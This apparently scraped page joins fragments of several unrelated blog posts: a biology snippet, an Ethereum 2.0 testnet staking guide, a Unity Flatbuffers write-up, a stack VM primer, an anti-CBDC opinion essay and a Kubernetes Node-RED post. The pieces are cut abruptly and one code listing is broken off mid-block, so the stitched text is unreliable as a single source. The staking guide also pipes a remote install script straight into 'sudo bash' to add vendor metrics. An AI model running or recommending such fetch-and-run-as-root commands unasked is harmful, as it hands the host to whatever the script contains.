Hepatitis B virus, for which multiple effective vaccines exist. </p></li><li><p>Telomeres are structures present at the ends of human chromosomes which are maintained by a protein complex called telomerase that uses a reverse transcriptase called TERT to maintain them. The reasons this is necessary are discussed below. They are about 5-15 kilobases long normally, and shortening results in arrest of cell growth and replication (senescence), or can even trigger cell death by apoptosis. </p></li></ul></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1606152858324_15060"><div>

  <div itemprop="articleBody">
    <p>Ethereum is one of the leading crypto projects (second to bitcoin). In December 2020 Ethereum released the first stage of Ethereum 2.0. The biggest difference is that there is no need for an expensive calculation to validate blockchain transactions, miners can earn money only by staking their coins. This is a shift from proof-of-work to <a href="https://ethereum.org/en/eth2/staking">proof-of-stake</a>. You can read more on the vision <a href="https://ethereum.org/en/eth2/vision">here</a>.</p>

<h3 id="what-does-it-mean-for-you">What does it mean for you?</h3>

<p>If you want to “mine” eth you don’t need to invest in an expensive server farm anymore, all you need is to stake at least 32ETH and run the eth2 clients for as little as $10/month. In return you will earn passive income - currently, <a href="https://docs.google.com/spreadsheets/d/15tmPOvOgi3wKxJw7KQJKoUe-uonbYR6HF7u83LR5Mj4/edit#gid=842896204">around 10%</a>. The more people stake their eth the lower the interest rate will be. You can find the latest rate <a href="https://launchpad.ethereum.org/">here</a>.
In case you have at least 32ETH and you are OK to stake it for at least a year, probably more, until Ethereum reach their <a href="https://docs.ethhub.io/ethereum-roadmap/ethereum-2.0/eth-2.0-phases">next phase</a>, you can use this guide to learn how to do it.
This solution is great if you want to hold your ETH coins for 1-2 years and earn passive income by doing so.
<strong>This guide is for educational purposes only.</strong></p>

<h3 id="install-metamask">Install Metamask</h3>

<p>We will use Metamask as our ethereum wallet. You can install it from <a href="https://metamask.io/">here</a>. Do not lose the password and paraphrase for your wallet.<br>
After you finished installing your wallet, make sure you select the <code>goerli</code> (test) network.
<img src="https://sagivo.com/assets/ethereum-11.png" alt="Metamask Goerli"></p>

<h3 id="get-goerli">Get Goerli</h3>

<p>Since we are using the Goerli test network, we will need some coins to play with. To be a validator you will need ether. You can get test ether coins from <a href="https://faucet.goerli.mudit.blog/">here</a>. All you need is to tweet your <strong>goerli</strong> wallet address. Make sure you ask for at least 32 eth (the minimum for a validator node).</p>

<h3 id="become-eth2-validator">Become eth2 validator</h3>

<p>Go to the Ethereum 2.0 pyrmont (test) <a href="https://pyrmont.launchpad.ethereum.org/">launchpad site</a> and click on <code>GET STARTED</code>. Read all the warnings and information, make sure you understand them all.<br>
The next step is to <a href="https://pyrmont.launchpad.ethereum.org/select-client">select your client</a> - choose <a href="https://github.com/sigp/lighthouse">lighthouse</a>.<br>
Select how much eth you want to stake, 32 eth is the minimum.
You will also need to <a href="https://pyrmont.launchpad.ethereum.org/generate-keys">select your local machine’s operating system</a> to <a href="https://github.com/ethereum/eth2.0-deposit-cli/releases/">download the CLI</a>. In this post I use Mac, but you can choose whatever OS you use. Open and extract the CLI folder you downloaded from GitHub. Inside that folder, you will find a <code>deposit</code> file. Run this file using: <code>/path/to/deposit new-mnemonic --num_validators 1 --chain pyrmont</code>. Please note:<br>
<code>/path/to/deposit</code> is whenever your downloaded <code>deposit</code> file is.<br>
<code>--num_validators</code> has the number of validators you want to have. Each validator is 32ETH.<br>
<code>pyrmont</code> is the test network. You should change it if you want to work on the main network (aka real money).</p>

<p>Here is example of the output you will have:</p>

<div><div><pre><code><span>&gt;</span> /Users/sagivo/Desktop/eth2deposit-cli-ed5a6d3-darwin-amd64/deposit new-mnemonic <span>--num_validators</span> 1 <span>--chain</span> pyrmont
Please choose your mnemonic language <span>(</span>czech, chinese_traditional, chinese_simplified, english, spanish, italian, korean<span>)</span> <span>[</span>english]: english
Type the password that secures your validator keystore<span>(</span>s<span>)</span>:
Repeat <span>for </span>confirmation:
</code></pre></div></div>

<p>You will be asked to choose a validator password. Do not lose this password, you will need it to get your money back at some point. <strong>This is not your wallet password</strong>, select a new password just for the validator client. After selecting the password you will get a seed phrase to store in case you lost your validator password. Store the seed phase in a secure location as well.<br>
If everything went well you should see a hippo(?) image.<br>
<img src="https://sagivo.com/assets/ethereum-4.png" alt="Ethereum CLI validator"></p>

<p>Open the folder with the keys. In this folder you will find a few files:<br>
<code>deposit_data-[some number].json</code> - this is the information for your deposit.<br>
<code>keystore-[some number].json</code> - you will have one or more files based on the number of validators you selected.
In this stage, you have all you need to install the local clients. Keep this window open, we will get back to it after we install the clients.</p>

<h3 id="ethereum-client-components">Ethereum client components</h3>

<p>Now that you staked your eth, you will need 3 nodes to become ETH 2.0 validator:</p>

<ul>
  <li><strong>ETH 1.0 client</strong>: this client will listen to the Ethereum 1.0 network. You can either run a local client or use a free 3rd party node. To save resources and keep this post simple, I’m using a free <a href="https://dashboard.alchemyapi.io/signup?referral=5f4b22ad-1a24-46af-ab1c-4475e8fe177d">alchemyapi.io</a> node. You can find more 3rd party options <a href="https://ethereumnodes.com/">here</a>.</li>
  <li><strong>Beacon node</strong>: ethereume 2.0 client.</li>
  <li><strong>Validator client</strong>: to validate eth2 transactions.</li>
</ul>

<h3 id="create-eth1-client">Create eth1 client</h3>

<p>You can either create a local eth1 client or use a 3rd party node instead. Let’s use a 3rd party today. Open a free <a href="https://dashboard.alchemyapi.io/signup?referral=5f4b22ad-1a24-46af-ab1c-4475e8fe177d">alchemyapi.io</a> and <a href="https://dashboard.alchemyapi.io/apps">create an app</a>. Make sure you select the <code>Goerli</code> network for your eth1 node.</p>

<p><img src="https://sagivo.com/assets/ethereum-9.png" alt="Alchemyapi node"></p>

<p>After the app has been created go to the app’s page and click on <code>VIEW KEY</code>, you will need to copy the HTTP URL for the beacon node.
<img src="https://sagivo.com/assets/ethereum-10.png" alt="Alchemyapi address"></p>

<h3 id="hosting-your-beacon-node-and-validator-client">Hosting your beacon node and validator client</h3>

<p>You can run your beacon node and validator client on a local computer. Beacon nodes are intended to be high-performance, highly available platforms that can support connections to numerous validator clients and maintain ongoing p2p connectivity with other beacon nodes. As such, their hardware requirements are anticipated to be server-grade CPU/SSD/networking connections.<br>
Your server needs to be available 24/7 or you will accrue penalties and lose ETH. This is why I prefer running my nodes on a hosted cloud server. In this tutorial, I choose <a href="https://m.do.co/c/29d9028f31d1">Digitalocean</a>. After playing with multiple specs, I’ve found that you can run your beacon node and validator client for just $10/month. Use <a href="https://m.do.co/c/29d9028f31d1">this link</a> to sign up for digitalocean and get $100 credit! This should cover your Ethereum staking expenses a while :)</p>

<h3 id="creating-a-digitalocean-droplet">Creating a digitalocean Droplet</h3>

<p>From your Digitalocean account, create a <a href="https://cloud.digitalocean.com/droplets/new">new droplet</a>.<br>
Choose the <code>Ubuntu</code> droplet. This will create a UNIX server running Ubuntu. <img src="https://sagivo.com/assets/ethereum-1.png" alt="Ubunto droplet"></p>

<p>Select the $10/mo plan. The $10/month spec is the bare minimum you should choose. If you want to choose a stronger instance go for it.</p>

<p><img src="https://sagivo.com/assets/ethereum-2.png" alt="10 dollar plan"></p>

<p>Setup SSH access under the <code>Authentication</code> section. This is important to be able to access your server from your terminal.<br>
You can leave the other settings as-is.<br>
Once your droplet setup is completed copy the ip address from the dashboard.<br>
<img src="https://sagivo.com/assets/ethereum-3.png" alt="copy ip"></p>

<h3 id="setting-up-your-cloud-server">Setting up your cloud server</h3>

<p>By now you should have a running digital ocean server and you should have generated <code>validator_keys</code> locally using the CLIt. Now let’s access your digital ocean machine to set it up.
First, let’s copy your local <code>validator_keys</code> folder to your hosted server.</p>

<div><div><pre><code>scp <span>-pr</span> /path/to/your/local/validator_keys <a href="https://sagivo.com/cdn-cgi/l/email-protection" data-cfemail="582a37372c183c313f312c3934">[email&nbsp;protected]</a>_ocean_ip:/validator_keys
</code></pre></div></div>

<ul>
  <li><code>/path/to/your/local/validator_keys</code>: the path for your local folder containing the generated validator keys.</li>
  <li><code>digital_ocean_ip</code>: your digitalocean machine’s IP.</li>
</ul>

<p>Now that we copied the keys to the droplet (digitalocean instance), let’s SSH into this machine.</p>



<ul>
  <li><code>digital_ocean_ip</code>: your new machine’s IP.</li>
</ul>

<p>The first (optional) step is to enable better metrics on the machine to track later in digitalocean. This will let you inspect CPU, memory, disk I/O, and other metrics in the digitalocean dashboard.</p>

<div><div><pre><code>curl <span>-sSL</span> https://repos.insights.digitalocean.com/install.sh | <span>sudo </span>bash
</code></pre></div></div>

<h3 id="install-lighthouse">Install Lighthouse</h3>

<p>In this step, we will install lighthouse on your new server. <a href="https://github.com/sigp/lighthouse">Lighouse</a> is an open-source Ethereum 2.0 client, written in <a href="https://www.rust-lang.org/">Rust</a> and maintained by Sigma Prime.</p>

<ol>
  <li>Go to the <a href="https://github.com/sigp/lighthouse/releases">Lighthouse releases page</a> and select the latest linux release.</li>
  <li>Download the portable binary <code>wget lighthouse-${VERSION}-x86_64-unknown-linux-gnu-portable.tar.gz</code>.</li>
  <li>Extract the archive: <code>tar -xvf lighthouse-${VERSION}-x86_64-unknown-linux-gnu.tar.gz</code></li>
  <li>Test the binary with <code>./lighthouse --version</code> (it should print the version).</li>
  <li>Move the lighthouse binary to a location in your PATH, so the lighthouse command can be called from anywhere: <code>cp lighthouse /usr/bin</code></li>
  <li>
    <p>Clean your downloaded files</p>

    <div><div><pre><code><span>rm </span>lighthouse
<span>rm </span>lighthouse-<span>${</span><span>VERSION</span><span>}</span><span>-x86_64-unknown-linux-gnu</span>.tar.gz
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="import-validator-keys">Import validator keys</h3>

<p>We will import the validator keys so we can use them by the validator.</p>

<div><div><pre><code><span>mkdir</span> <span>-p</span> /var/lib/lighthouse
lighthouse account validator import <span>--directory</span> /validator_keys <span>--datadir</span> /var/lib/lighthouse
</code></pre></div></div>

<ul>
  <li><code>/var/lib/lighthouse</code>: this folder will store our lighthouse data.</li>
  <li><code>--directory /validator_keys</code>: our imported <code>validator_keys</code> folder locaiton.</li>
</ul>

<p>You will be prompted to insert a password. Insert the password for your validator client again.</p>

<h3 id="run-beacon-node">Run beacon node</h3>

<p>We will run the beacon node as a daemon service. This way it will auto-restart if there’s an error. It’s important to have your eth 2.0 service running 24/7 to not accrue penalties and lose eth.</p>

<div><div><pre><code>nano /etc/systemd/system/lighthousebeacon.service
</code></pre></div></div>

<p>Paste this text:</p>

<div><div><pre><code>[Unit]
Description=Lighthouse Eth2 Client Beacon Node
Wants=network-online.target
After=network-online.target

[Service]
Type=simple
Restart=always
RestartSec=5
ExecStart=/usr/bin/lighthouse bn --network pyrmont --staking --datadir /var/lib/lighthouse --eth1-endpoints https://eth-goerli.alchemyapi.io/v2/[your token]

[Install]
WantedBy=multi-user.target
</code></pre></div></div>

<p>This is a new service that will re-start if it fails.</p>

<ul>
  <li><code>--network pyrmont</code>: we use the test network</li>
  <li><code>--eth1-endpoints</code>: comma-separated http addresses of your eth1 client nodes.</li>
</ul>

<p>To reload the daemon use</p>



<p>Now let’s start the beacon daemon service:</p>

<div><div><pre><code>systemctl start lighthousebeacon
</code></pre></div></div>

<p>You can inspect the output using (safe to ctr+c once you’re done):</p>

<div><div><pre><code>journalctl <span>-fu</span> lighthousebeacon.service
</code></pre></div></div>

<p>Also, let’s enable the service to start on server restart:</p>

<div><div><pre><code>systemctl <span>enable </span>lighthousebeacon
</code></pre></div></div>

<h3 id="validator-client">Validator client</h3>

<p>Let’s create a validator service</p>

<div><div><pre><code>nano /etc/systemd/system/lighthousevalidator.service
</code></pre></div></div>

<p>Paste this:</p>

<div><div><pre><code>[Unit]
Description=Lighthouse Eth2 Client Validator Node
Wants=network-online.target
After=network-online.target

[Service]
Type=simple
Restart=always
RestartSec=5
ExecStart=/usr/bin/lighthouse vc --network pyrmont --datadir /var/lib/lighthouse --graffiti "YOLO"

[Install]
WantedBy=multi-user.target
</code></pre></div></div>

<p>This is a new service that will re-start if it fails.</p>

<ul>
  <li><code>--network pyrmont</code>: we use the test network</li>
  <li><code>--graffiti</code>: an optional message you want to include in your validation blocks.</li>
</ul>

<p>To reload the daemons use</p>



<p>Start the validator daemon service.</p></div></article></div></div></div>

December 27, 2020 | http://extrawurst.github.io/gamedev/unity/programming/rust/2020/12/26/unity-flatbuffers.html | <a href="https://web.archive.org/web/*/http://extrawurst.github.io/gamedev/unity/programming/rust/2020/12/26/unity-flatbuffers.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>We recently switched from downloading and parsing JSON in our Unity client to a binary format based on Flatbuffers.
In this this article you are going to learn:</p>

<ul>
  <li><em>why</em> we did that</li>
  <li><em>what</em> Flatbuffers is anyway</li>
  <li><em>how</em> you can do that yourself</li>
  <li>what <em>benefit</em> we gained</li>
</ul>

<p><strong>TL;DR</strong></p>

<p>You are looking to simplify your life integrating Flatbuffers in Unity? Look no further: <a href="https://github.com/gameroasters/flatbuffers-unity-docker">gameroasters/flatbuffers-unity</a></p>



<p>Our recent game <em>Wheelie Royale</em> (<a href="https://apps.apple.com/US/app/id1518264893">Appstore</a> / <a href="https://play.google.com/store/apps/details?id=com.gameroasters.wheelieroyale&amp;hl=en&amp;gl=US">Playstore</a>) downloads a lot of replay data by other players. Replay data was transmitted in JSON format. In the most extreme cases up to 15mb of JSON for a single level.
While this is already a problem just because of mobile data usage it manifests even more severly in mid- to low-end devices when deserializing the JSON data.</p>

<p>After digging out my low-end test device (Galaxy S4) it took <a href="https://www.newtonsoft.com/json">Newtonsoft.JSON</a> <strong>20 sec</strong> to deserialize the 15mb. This is bad and for some players it even went up to a minute - an absolute dealbreaker.</p>

<p>Obviously we had to find a better method entirely.</p>



<blockquote>
  <p>FlatBuffers is an efficient cross platform serialization library (<a href="https://google.github.io/flatbuffers/">Flatbuffers website</a>)</p>
</blockquote>

<p>Initially a Google internal project for game development it received some fame when Facebook announced massive performance gains by utilizing it on their mobile app (<a href="https://engineering.fb.com/2015/07/31/android/improving-facebook-s-performance-on-android-with-flatbuffers/">article</a>).</p>

<p>Using Flatbuffers gives us two main advantages:</p>

<ol>
  <li>Data is stored in binary form making it easy on the bandwidth</li>
  <li>Accessing Data is very fast since it is just a lookup from contiguous memory</li>
</ol>

<p>The following graphic visualizes this:</p>

<p><img src="http://extrawurst.github.io/assets/flatbuffers/fb.jpeg" alt="fb"></p>

<p>Flatbuffers store data in a <strong>contiguous</strong> chunk of memory making it also easy on the garbage collector that especially in our use case was trashed with a lot of small allocations.
If you mainly read your data from a buffer and do not need to alter it (our exact use case) it escentially reduces allocations to zero (reusing a static buffer).</p>

<p>Aside the compact memory layout Flatbuffers reduces the memory consumption by expecting both parties to know the schema. We later see how we generate code for client and backend to be able to speak the same <em>language</em>.</p>

<h2 id="comparison">Comparison</h2>

<ul>
  <li><strong>Before</strong>: Deserializing 15mb of Json in <strong>20 secs</strong></li>
  <li><strong>After</strong>: Parsing the same data but using Flatbuffers (4mb) in <strong>0,5 sec</strong></li>
</ul>

<p>This is a speed improvement of <strong>40x</strong>.</p>

<p><strong>Disclaimer</strong>: Of course this is not a proper scientific benchmarking method but it holds true even on our modern iPhones (albeit on a much smaller scale). I leave the more scientific methods of benchmarking to people smarter than me: 
<a href="https://google.github.io/flatbuffers/flatbuffers_benchmarks.html">benchmark</a></p>



<p>Here is a simplified version of our schema file. Keep in mind that we are dealing with playbacks (ghosts) of other players. Each ghost consists of a TON of deltas (Sample) that allow us to replay them.</p>

<pre><code>struct Sample {
  //...
  r: int16;
}

table GhostRecording {
  //...
  deltas: [Sample] (required);
}

table Ghost {
  //...
  recording: [GhostRecording] (required);
}

table Ghosts {
  //...
  items:[Ghost] (required);
}

root_type Ghosts;
</code></pre>

<p>Here you can see why our use case was particularly tough for the garbage collector in Unity since we are dealing with a lot of small individually allocated objects.</p>

<p>If you want to to more about the differences of <code>table</code> and <code>struct</code> you can find all details about the schema here: <a href="https://google.github.io/flatbuffers/flatbuffers_guide_writing_schema.html">Flatbuffers Schema</a></p>

<h2 id="code-generation">Code generation</h2>

<p>When it comes to the pipeline required to get this working I was disappointed at how little was available: no easy docker container to get <code>flatc</code> (the schema transpiler) working cross platform, no ready built .net library for Unity to get started.</p>

<p>So I built this and open sourced it on our company github: <a href="https://github.com/gameroasters/flatbuffers-unity-docker">gameroasters/flatbuffers-unity</a></p>

<p>Using this docker container it is easy to create your serialization/deserialization code using the following snippet:</p>

<div><div><pre><code>docker run <span>-it</span> <span>-v</span> <span>$(</span>shell <span>pwd</span><span>)</span>:/fb gameroasters/flatbuffers-unity:v1.12.0 /bin/bash <span>-c</span> <span>"cd /fb &amp;&amp; </span><span>\</span><span>
	flatc -n --gen-onefile schema.fbs &amp;&amp; </span><span>\</span><span>
	flatc -r --gen-onefile schema.fbs"</span>
</code></pre></div></div>

<p>This will mount your current working directory into the container, it is expecting to find a <code>schema.fbs</code> file in here and generate the necessary code for <em>Rust</em> and <em>CSharp</em> for you in two files called <code>schema.rs</code> and <code>schema.cs</code>.</p>



<p>Flatbuffers is not going to make your code more readable. Here is an example how we read in our ghosts from it:</p>

<div><div><pre><code><span>var</span> <span>fb_ghosts</span> <span>=</span> <span>GR</span><span>.</span><span>WR</span><span>.</span><span>Schema</span><span>.</span><span>Ghosts</span><span>.</span><span>GetRootAsGhosts</span><span>(</span><span>new</span> <span>ByteBuffer</span><span>(</span><span>data</span><span>));</span>

<span>var</span> <span>res</span> <span>=</span> <span>new</span> <span>List</span><span>&lt;</span><span>Ghost</span><span>&gt;(</span><span>fb_ghosts</span><span>.</span><span>ItemsLength</span><span>);</span>

<p>Unlike some alternatives to Flatbuffers it does not create the Plain-Old-Data (POD) objects for you and deserialize into those. But that is by design. You could actually go without them when you only need to access it for reading.</p>

<p>We only create those to keep the code compatible with the previous approach that deserialized JSON into POD objects.</p>



<p>Of course there are alternatives that I do not want to hide:</p>

<ul>
  <li><a href="https://developers.google.com/protocol-buffers">protobuf</a></li>
  <li><a href="https://github.com/capnproto/capnproto">cap’n’proto</a></li>
</ul>

<p>Here is a very nice comparison matrix: https://capnproto.org/news/2014-06-17-capnproto-flatbuffers-sbe.html</p>

<p>The main benefit for <strong>protobuf</strong> is that it does the extra step of creating POD objects for you bringing it even closer to what you are used to in regular JSON deserialization. It is a good tradeoff between speed (Flatbuffers) and convenience (JSON). Another nice thing is: protobuf also speaks JSON which simplifies debugging a lot.</p>

<p>The other alternative - <strong>cap’n’proto</strong> - is actually made by the <a href="https://stackoverflow.com/a/25370932/1397367">same guy</a> who made protobuf and uses the same zero-allocation approach Flatbuffers uses. <strong>cap’n’proto</strong> does not support as many languages yet - thats the only reason I did not consider giving it a try (yet).</p>

<p>Ultimately there is no <em>best</em> solution, everything comes at a cost. If you need raw speed there is not much more you can get compared to Flatbuffers.</p>

<p>In this series we’re going to delve a bit into stack based virtual machines. First we’re going to see an overview, then we’ll build our own toy VM. Next, we’re going to see how what we’ll build maps to a real CPU. Finally, we’ll discuss the most famous of all: the JVM.</p>

<h3 id="introduction">Introduction</h3>

<p>What’s a <em>stack based virtual machine</em> then? It’s an abstraction of a computer, that emulates a real machine. Generally it is built as an interpreter of a special <em>bytecode</em>, that translates its in real time for execution on the CPU.</p>

<p>Let’s start with a trivial example: suppose your program needs to add two numbers. To do that in a stack VM, the program will <em>push</em> the first number to the stack, <em>push</em> the second and then execute some form of the special instruction <em>add</em>, that will <em>pop</em> the first two elements of the stack and replace them with their sum. Let’s see it step by step:</p>

<p><img src="https://andreabergia.com/images/2015/03/Stack_1.png" alt="At the beginning"></p>

<p>The <code>SP</code> is the <em>stack pointer</em>, which refers to the head of the stack. The <code>IP</code> is the <em>instruction pointer</em>, which points to the address of the current instruction to execute. Let’s now execute the first instruction:</p>

<p><img src="https://andreabergia.com/images/2015/03/Stack_2.png" alt="After the first instruction"></p>

<p>You can see that the stack now contains <code>1</code> and that the instruction pointer has been moved to the next instruction. Let’s now simulate the second instruction:</p>

<p><img src="https://andreabergia.com/images/2015/03/Stack_3.png" alt="After the second instruction"></p>

<p>Finally we can execute the <code>add</code> instruction:</p>

<p><img src="https://andreabergia.com/images/2015/03/Stack_4.png" alt="After the add"></p>

<p>The head of the stack and the previous element have been popped and replaced with their sum.</p>

<h3 id="centrality-of-the-stack">Centrality of the stack</h3>

<p>As you have seen from the example, the main two data structures for a stack VM are the code listing, with the instruction pointer, and the stack data, which is accessed only via the stack pointer. While these two data structures seem trivial, they are more than enough to implement a lot of complex programs. By adding some external memory area (what is generally known as “memory on the heap”), this structure will become complex enough to form the basis of a real language such as Java or Scala.</p>

<p>The stack will be the central structure. From what we hve seen above you should have some idea on how to use it to implement the basic arithmetic, but it is also going to be the basis of implementing loops and conditional execution (if) and even function calls! We’re going to discuss all of this while building our toy VM.</p>

<h3 id="register-based-virtual-machines">Register based virtual machines</h3>

<p>Closely related to stack based VM are <em>register based virtual machines</em>. They are also interpreters of bytecode, but their design is quite different, since they don’t use the stack for the operands but rather a set of registers. While they tend to be more complex, they are also generally faster at runtime, since they map much more closely to the CPU (which, as we’ll see later, is actually an hardware register machine) and thus they tend to generate and execute better efficient code.</p>

<p>However stack based virtual machines are not just a learning toy. The most successful VM ever, the <a href="https://en.wikipedia.org/wiki/Java_virtual_machine">Java Virtual Machine</a>, is a stack-based virtual machine (and so is the <a href="https://en.wikipedia.org/wiki/Common_Language_Runtime">CLR</a>, the basis of .NET). Furthermore the JVM is <em>extremely</em> high performant, while still quite simple - although that has been achieved more by the <em>immense</em> amount of money that has flown into its development than by some special characteristic of its architecture.</p>

<p>The most famous example of a register based virtual machine is probably <a href="http://www.lua.org/">LUA</a>, which can achieve <a href="http://luajit.org/performance.html">amazing performances</a> and is used in <a href="https://en.wikipedia.org/wiki/Category:Lua-scripted_video_games">many videogames</a> as a scripting language.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" data-updated-on="1605643941671" id="item-5fb42c70669e655a2de5be01"><div><div><div data-block-type="2" id="block-36140108062efd62704e"><div><p><em>This text was published at </em><a href="https://mises.org/wire/why-central-bank-digital-currencies-are-bad-idea"><em>Mises Institute</em></a></p><p>The Central Banking Digital Currencies (CBDC) are being sold with the narrative of protecting consumers who are increasingly moving to cashless payments and as a result, robbing themselves of the privacy advantages of cash and exposing themselves to bank runs, payment network blackouts, and to foreign financial adversaries.</p><p>While these risks are real, they would be negligible had it not been for the central banking and financial regulators’ interventions into the market (more on that in the last couple of paragraphs), and CBDCs if anything make them worse and introduce some new, much bigger ones.</p><p>While the stated intention behind their design is to keep the commercial banks in the picture, CBDCs will bring the end-users of the future tokens closer to the central banks. This is because blockchains and blockchain-inspired distributed ledger technologies are built on a single, common, ledger, which is distributed either in a permissionless or permissioned manner. The permissionless distribution exposes a lot of information about the network participants, but in combination with proof-of-work verification makes it very difficult for an adversary to attack and overtake the network and e.g. change the inflation rate.</p><p>Permissioned network with no proof-of-work or similar consensus algorithm not only doesn’t provide the immutability feature but by having a single permissioned ledger gives potential control to those who grant the network privileges. As a result, the central bank as the ultimate permission issuer would have much stronger control over the monetary system and payment network than they have right now. This gives the central banks three very dangerous capabilities.</p><h2>Helicopter Money</h2><p>The reason why we’ve seen such an elevated business cycle over the past century is the central banking fiat money system. Unnatural expansion of the money supply causes booms, which are unsustainable and markets try to clear them when they are exposed as such.</p><p>Economists of the Austrian school understand, that the boom is the real problem and the economic crisis is the necessary and positive cleansing mechanism. Unfortunately, the (neo)Keynesian response to such an event is to prop the markets up by further monetary interventions.</p><p>However, the current design of the banking system requires the intermediary role of commercial banks in issuing credit to businesses. Central banks get frustrated when the commercial banks exercise caution in an economy, which hasn’t fully cleared the previous misallocations and hasn’t brought prices of capital goods to more sustainable levels.</p><p>Furthermore, since the predominant Keynesian narrative is that spending drives the economy (hint: it doesn’t - capital investments do), the central banks would like to spur more consumer spending by issuing money supply directly to consumers. Needless to say, commercial banks’ cautious approach to consumer credit in a period of growing unemployment doesn’t align well with the central bank’s goals either. During the COVID crisis, the governments managed to an extent to get around these hurdles by issuing benefits en masse, but those are complicated by logistics, bureaucracy, or legislation.</p><p>By closer integration of the monetary spigot to the end consumers and businesses, the central bank can much more easily issue credit, or just outright cashouts to the private individuals and commercial entities by simply “airdropping” new tokens to the existing token identities. They would not even compromise their stated intention of keeping the commercial banks in the picture - those would still serve as custodians of the token keys, and even have the ability to issue credit along the traditional lines.</p><p>This would lead to disastrous consequences. Economies get easily addicted to central banks’ money dope. With every new crisis, the chief monetarists had to increase intervention doses the same way as junkies have to do with their drug of choice. As with every addiction, the longer it lasts and the stronger it grows, the more difficult it is to cure it. And while monetary overdose such as we’ve seen in Zimbabwe or Venezuela might not come for a long time, if ever, junkies don’t perform well, as Japan’s three lost decades of BOJ’s interventions have demonstrated.</p><h2>Negative Interest Rates</h2><p>Hoarding is evil - or so the modern monetarists’ narrative goes. In the Keynesian framework, there is no space for the function of cash as a hedge in times of uncertainty. Savings accounts, in their minds, are just money that doesn’t work in spurring the miracles of spending- and monetary-driven economic growth. Negative interest rates are then potentially the most effective method of preventing hoarding by incentivizing account holders to spend their depreciating balances.</p><p>Currently, the central banks have to rely on commercial banks to pass the negative interest rates on their customers. Commercial banks instead are trying to convince the account holders to move their deposits from negative yielding accounts to interest yielding products and are consuming the negative rates on most of the outstanding cash balances.</p><p>With the central bank tokens being tied more tightly with their issuance authority, it would be much easier for the monetary interventionists to impose negative interest rates on all tokens in circulation. This would on a margin certainly increase the consumers’ and businesses’ propensity to spend and would also drive asset prices up as people would try to offload their cash savings. But to think of it as something beneficial is foolish. It was massive spending, record-low savings, and unsustainable asset valuations that led to the credit bubbles and crises of the past decades. To think that more of the same recipe would lead to a different, let alone better outcome is ludicrous.</p><h2>Financial Surveillance</h2><p>Third and final major implication of cash tokenization is the potential it creates for financial surveillance. The central banks are ostensibly introducing digital tokens to protect people’s privacy in the face of those reducing their anonymous cash usage. But the idea that any branch of government, let alone the one that imposes KYC/AML rules on the existing crypto token platforms, limits physical cash use to prevent tax avoidance, and uses financial surveillance to catch non-violent “criminals” cares about our privacy is laughable.</p><p>They’re not even hiding the fact, that tokenization of money would allow them to run what they call “data analytics”, but to think that they would not make the leap from aggregate analytics to individual data processing would be naive.</p><p>Of course, it’s not a coincidence, that China is the global leader in CBDCs. The surveillance potential of centralized tokenization is extremely attractive to the government that tries to keep tabs on every aspect of the lives of their underlings.</p><p>The proponents of the central banking tokens argue, that consumers need to be protected against targeted attacks on a country’s payment network. While such a risk exists - for example, if a country like Switzerland tried to provide anonymity for foreign depositors as it used to and as a result Visa and Mastercard would be pressured to shut down their payment networks for the country - if it materializes, the economy can always temporarily revert back to cash, supported by a vast network of local ATMs and bank branches.</p><p>If anything, the biggest attacks on the monetary exchange in the western world came from the governments themselves suspending or limiting cash withdrawals in times of liquidity crises as was the case in Cyprus or Greece, not to mention that those crises themselves were caused by central banking credit bubbles of the preceding periods.</p><p>Finally as was already mentioned, the argument about the protection of consumer privacy doesn’t pass the laugh test considering the history of continuous erosion of financial privacy by central banks and financial regulators.</p><p>In conclusion, the same characteristics for which people should oppose the transition to CDBCs give central banks the strongest reason to champion and implement them. And while the pretense of an investigation into the fiat money tokenization gives an impression of a debate on the topic, the reality is, there will be no debate and the digital currencies will go through and give central banks more control than they had before with all the disastrous consequences such control brings.</p></div></div></div></div></div></div></div>]]>

<p>Having built a working example of <a href="https://www.hardill.me.uk/wordpress/2020/10/01/multi-tenant-node-red/" data-type="post" data-id="3981">Multi Tenant Node-RED </a>using Docker I thought I’d have a look at how to do the same with Kubernetes as a Christmas project.</p>



<p>I started with installing the 64bit build of Ubuntu Server on a fresh Pi4 with 8gb RAM and then using snapd to install <a href="https://microk8s.io/">microk8s</a>. I had initially wanted to use the 64bit version of Raspberry Pi OS, but despite microk8s <a href="https://microk8s.io/docs">claiming</a> to work on any OS that support snapd, I found that containerd just kept crashing on Raspberry Pi OS.</p>



<p>Once installed I enabled the dns and ingress plugins, this got me a minimal viable single node Kubernetes setup working. <br></p>

<p>I also had to stand up a private docker registry to hold the containers I’ll be using. That was just a case of running <code>docker run -d -p 5000:5000 --name registry registry</code> on a local machine e.g <code>private.example.com</code> . This also means adding the URL for this to microk8s as described <a href="https://microk8s.io/docs/registry-private">here</a>.</p>



<p>Since Kubernetes is another container environment I can reuse most of the parts I previously created. The only bit that really needs to change is the Manager application as this has to interact with the environment to stand up and tear down containers.</p>



<h2>Architecture</h2>



<p>As before the central components are a MongoDB database and a management web app that stands up and tears down instances. The MongoDB instance holds all the flows and authentication details for each instance. I’ve deployed the database and web app as a single pod and exposed them both as services</p>

<p>This Deployment descriptor basically does all the heavy lifting. It sets up the mangment app, MongoDB and the private NPM registry.</p>



<p>It also binds 2 sets of secrets, the first holds holds the authentication details to interact with the Kubernetes API (the <code>~/.kube/config</code> file) and the <code>settings.js</code> for the management app. The second is the config for the Veraccio NPM registry.</p>



<p>I’m using the <a href="https://kubernetes.io/docs/concepts/storage/volumes/#hostpath">HostPath</a> volume provider to store the MongoDB and the Veraccio registry on the filesystem of the Pi, but for a production deployment I’d probably use the NFS provider or a Cloud Storage option like AWS S3.</p>



<h2>Manager</h2>



<p>This is mainly the same as the <a href="https://github.com/hardillb/multi-tenant-node-red-manager">docker version</a>, but I had to swap out <a href="https://npmjs.com/package/dockerode">dockerode</a> for <a href="https://www.npmjs.com/package/kubernetes-client">kubernetes-client</a>.</p>



<p>This library exposes the full kubernetes API allowing the creation/modification/destructions of all entities.</p>



<p>Standing up a new instance is a little more complicated as it’s now a multi step process.</p>



<ol><li>Create a Pod with the custom-node-red container</li><li>Create a Service based on that pod</li><li>Expose that service via the Ingress addon</li></ol>

<p>I also removed the Start/Stop buttons since stopping pods is not really a thing in Kubernetes.</p>



<p>All the code for this version of the app is on github <a href="https://github.com/hardillb/multi-tenant-node-red-k8s-manager">here</a>.</p>



